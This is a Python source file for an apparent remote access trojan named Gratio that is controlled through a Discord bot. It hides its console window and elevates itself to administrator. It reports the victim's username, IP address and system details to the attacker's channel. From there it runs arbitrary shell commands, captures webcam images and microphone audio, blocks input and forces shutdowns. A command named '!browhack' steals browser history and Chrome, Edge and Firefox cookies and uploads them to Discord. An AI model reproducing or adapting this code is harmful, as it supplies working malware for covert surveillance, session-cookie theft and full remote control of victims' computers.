# Please read the docs first https://github.com/gameisntover/Gratio
import os
import platform
import webbrowser

import pyaudio
import win32gui
import browser_cookie3
import browserhistory
import pyttsx3
import discord
from requests import get
import ctypes
import win32con
import cv2
import pyuac
from discord import File, TextChannel

# ---------------=[Configuration Section]=------------------
token = ""
guild_id = 0
hide_console = True
run_as_admin_startup = True
# -------------=-=[                     ]=------------------
helpmsg = """
!speak hello: say's hello
!error title
subtitle: shows an error with the specified title and subtitle.
!blockinput: blocks windows input (REQUIRES ADMINISTRATOR)
!shutdown: force shutdowns the target
!restart: force restarts the target
!execute command args: executes windows CMD commands supports args too.
!webcam: sends a picture from the targets' webcam
!browser url: opens a new tab and goes to the specified url.
"""


def show_message_box(title, message, style):
    ctypes.windll.user32.MessageBoxW(1, title, message, style)


def take_pic():
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result:
        cv2.imshow("nnt", image)
        cv2.imwrite("nnt.png", image)
    return result


if hide_console:
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

client = discord.Client(intents=discord.Intents.default())
text_channel: TextChannel
guild: discord.Guild
if not pyuac.isUserAdmin() and run_as_admin_startup:
    pyuac.runAsAdmin()


@client.event
async def on_ready():
    global guild
    guild = client.get_guild(guild_id)
    global text_channel
    text_channel = await guild.create_text_channel(name=f'session {os.getenv("USERNAME")}')
    await text_channel.send(content=f"""
Hey, there's a new session connected. 🙂
Username: {os.getenv("USERNAME")}
IP address: {get("https://api.ipify.org").content.decode('utf8')}
Is administrator: {pyuac.isUserAdmin()}
OS: {platform.platform()}    

say !help for help!
""")


# -------= under development =-------
class Command:
    def get_name(self):
        pass

    def on_execute(self, args: str):
        pass

    def get_description(self):
        pass


# ------------=                 =--------------

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True,
                                   input_device_index=input_device, frames_per_buffer=chunk)

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)


@client.event
async def on_message(message: discord.Message):
    if message.channel is not text_channel:
        return
    if message.author is client.user:
        return

    if message.content.startswith("!speak "):
        text = message.content[len("!speak "):]
        pyttsx3.speak(text)
    elif message.content.startswith("!error "):
        text = message.content[len("!error "):]
        args = text.split("\n")
        title = args[0]
        text = text[len(title) - 1:]
        show_message_box(title, text, 5)
    elif message.content.startswith("!browser "):
        text = message.content[len("!browser "):]
        browserhistory.get_browserhistory()
        browser = webbrowser.WindowsDefault()
        browser.open_new_tab(text)
    elif message.content.startswith("!execute "):
        text = message.content[len("!execute "):]
        os.system(text)

    else:
        match message.content:
            case "!restart":
                os.system("shutdown /f /r")
            case "!shutdown":
                os.system("shutdown /f")
            case "!blockinput":
                ctypes.windll.user32.BlockInput(True)
            case "!webcam":
                if take_pic():
                    await text_channel.send(file=discord.File("nnt.png"))
                else:
                    await text_channel.send(content="No webcams were detected :(")
            # ----------= Under Development =-----------
            case "!browhack":
                browser = browserhistory.get_browserhistory()
                file_h = open("history.txt", "r+")
                chrome_c = open("chrome-c.txt", "r+")
                edge_c = open("edge-c.txt", "r+")
                firefox_c = open("firefox-c.txt", "r+")
                file_h.write(browser.__str__())
                chrome_c.write(browser_cookie3.Chrome().load())
                edge_c.write(browser_cookie3.Edge().load())
                firefox_c.write(browser_cookie3.Firefox().load())
                await text_channel.send(
                    files=[File("history.txt"), File("chrome-c.txt"), File("edge-c.txt"), File("firefox-c.txt")])
            # ---------=                 =------------
            case "!help":
                await text_channel.send(content=f"```{helpmsg}```")
            case "!streamvoice":
                if message.author.voice is not None:
                    voice_channel = message.author.voice.channel
                    vc = await voice_channel.connect()
                    vc.play(PyAudioPCM(), after=lambda e: print(f'Player error: {e}') if e else None)


client.run(token)
